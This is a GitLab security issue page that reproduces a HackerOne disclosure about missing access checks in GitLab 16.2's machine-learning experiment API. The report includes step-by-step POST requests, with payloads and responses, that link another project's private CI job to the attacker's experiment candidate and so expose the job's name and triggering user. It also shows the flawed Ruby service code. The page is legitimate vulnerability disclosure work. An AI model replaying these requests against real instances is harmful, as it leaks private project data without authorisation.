=== Content from gitlab.com_1941f7ed_20250111_013045.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# A user is capable of associating CI jobs of a private project he is not a member of to his Machine Learning experiment candidate

⚠ **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2084199](https://hackerone.com/reports/2084199)** by `ricardobrito` on 2023-07-25, assigned to [@cmaxim](/cmaxim "Costel Maxim"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hi team!

#### Summary

Gitlab 16.2 recently introduced the ability to [Track your machine learning model experiments](https://about.gitlab.com/releases/2023/07/22/gitlab-16-2-released/#track-your-machine-learning-model-experiments). This feature contains some API calls that allows Machine Learning engineers to use Gitlab to track the parameters, results, etc of their Machine Learning experiments.

Users can also link the CI/CD job information to a particular model candidate. I have found that due to a lack of proper access control, users are capable of linking CI/CD jobs of private projects which they are not a member of (Impact 1). After that, they can view the job name and the name of the user who triggered the job, even though the job information is not visible for private projects (Impact 2).

#### Steps to reproduce

1. As a admin create a private project and have some pipelines run on the project. This will create some jobs
2. As a user who is not a member of the project created in step 1 (let's call him user A), create a new project of your own and keep track of the id.
3. As user A, keep track of the project id from step 2 and make the following POST request to the following endpoint:

   `https://YOUR-GITLAB-INSTANCE/v4/projects/:id/ml/mlflow/api/2.0/mlflow/experiments/create` and replace `:id` with the one from step 2. In the body of the request use the following payload:

```
{"name":"Experiment by user A"}
```

The response will return an experiment\_id:

```
{
    "experiment_id": "1"
}
```

Keep track of this id for the next step.

4. Still as user A, make a POST request to the following endpoint: `https://YOUR-GITLAB-INSTANCE/v4/projects/:id/ml/mlflow/api/2.0/mlflow/runs/create`, where the `id` is the one from step 2, with the following payload:

```
{"experiment_id":1, "tags": [{"key":"gitlab.CI_JOB_ID", "value":265}]}
```

where the `value` should be set to the id of any of the jobs of the private project from step 1. This will return the following response:

```
{
    "run": {
        "info": {
            "run_id": "22c4ed69-aefb-4fa4-ac81-97f134fcf92f",
            "run_uuid": "22c4ed69-aefb-4fa4-ac81-97f134fcf92f",
            "experiment_id": "1",
            "start_time": 0,
            "status": "RUNNING",
            "artifact_uri": "http://127.0.0.1:3000/api/v4/projects/20/packages/generic/ml_experiment_1/3/",
            "lifecycle_stage": "active",
            "user_id": "46"
        },
        "data": {
            "metrics": [],
            "params": [],
            "tags": [
                {
                    "key": "gitlab.CI_JOB_ID",
                    "value": "265"
                }
            ]
        }
    }
}
```

In my case, the private job id is 265. So now still as user A, if I go to the following endpoint:

`http://127.0.0.1:3000/ricardobrito1/ricardobrito1-project/-/ml/candidates/3`(please change the path according to your project or simply go to the menu on the left side->analyze->Model Experiments and click on the candidate), I can see the private job details under the **CI** section (user who triggered the job and name of the job), which means I have successfully associated a private job of a private project to my Machine Learning experiments:

[![Screenshot_2023-07-26_at_1.55.51_AM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/6fd03c10fd352e3481b18e4735dfc6308d468e3a/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f31303533336232362d386536322d346431342d623566352d3364643263396138663061302f53637265656e73686f745f323032332d30372d32365f61745f312e35352e35315f414d2e706e67)

Since the job id is incremental, a user can associate any job id he wants and can get this information from any job (public or private).

#### POC VIDEO

[ml-experiment-info-disclosure.mov](https://user-content.gitlab-static.net/9d49ecb22dfad45998b7a9e76f6c30b5faacd4e6/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32643631623938302d396138302d346532312d383762332d3337663165366630356134662f6d6c2d6578706572696d656e742d696e666f2d646973636c6f737572652e6d6f76 "Download 'ml-experiment-info-disclosure.mov'")

#### Technical details

The reason for this bug is because the function `handle_build_metadata` located in the file `app/services/ml/experiment_tracking/handle_candidate_gitlab_metadata_service.rb`, will look for any CI/CD job as long as the id is valid, and associate it with the candidate without checking if the user has permission to access the job:

```
﻿﻿module Ml
  module ExperimentTracking
    class HandleCandidateGitlabMetadataService
      def initialize(candidate, metadata)
        [@]candidate = candidate
        [@]metadata = metadata.index_by { |m| m[:key] }
      end

      def execute
        handle_build_metadata([@]metadata['gitlab.CI_JOB_ID'])

        [@]candidate.save
      end

      private

      def handle_build_metadata(build_metadata)
        return unless build_metadata

        build = Ci::Build.find_by_id(build_metadata[:value])

        raise ArgumentError, 'gitlab.CI_JOB_ID must refer to an existing build' unless build

        [@]candidate.ci_build = build
      end
    end
  end
end
```

The function `handle_build_metadata` searches and associates the candidate to a CI job as long as the job exists without performing any permission check.

#### Imapact

The impact here is two-fold:

1. A user is able of associating a private job from a private project he is not a member of to his ML experiment.
2. A user is capable of using this flaw to partially leak private job information.

#### Impact

There are 2 impacts here:

1. A user is able of associating a private job from a private project he is not a member of to his ML experiment.
2. A user is capable of using this flaw to partially leak private job information.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screenshot\_2023-07-26\_at\_1.55.51\_AM.png](https://h1.sec.gitlab.net/a/10533b26-8e62-4d14-b5f5-3dd2c9a8f0a0/Screenshot_2023-07-26_at_1.55.51_AM.png)
* [ml-experiment-info-disclosure.mov](https://h1.sec.gitlab.net/a/2d61b980-9a80-4e21-87b3-37f1e6f05a4f/ml-experiment-info-disclosure.mov)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


